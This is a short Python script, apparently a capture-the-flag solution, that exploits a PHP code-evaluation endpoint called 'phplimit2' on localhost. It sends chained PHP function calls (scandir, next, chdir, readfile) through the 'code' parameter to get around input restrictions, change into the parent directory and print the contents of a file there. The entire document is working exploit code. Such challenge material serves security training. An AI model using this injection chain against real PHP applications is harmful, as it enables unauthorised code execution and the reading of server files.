import requests
from phpserialize import loads

def get_dot():
	r = requests.get("http://localhost/ex.php")
	ret = r.text
	r.close()
	return ret

def eval_code(code):
	r = requests.get("http://localhost/phplimit2/", params={'code':code})
	ret = r.text
	r.close()
	return ret

def main():
	dot = get_dot()
	# code = 'echo(serialize(scandir({})));'.format(dot)
	# print eval_code(code)
	double_dot = 'echo(next(scandir({})));'.format(dot)
	print eval_code(double_dot)
	# code2 = 'echo(chdir({}));'.format(double_dot)
	# print eval_code(code2)
	chdir = 'pi(chdir(next(scandir({}))))'.format(dot)
	dot = dot.replace('pi()', chdir)
	code = 'echo(readfile(end(scandir({}))));'.format(dot)
	print eval_code(code)

if __name__ == '__main__':
	main()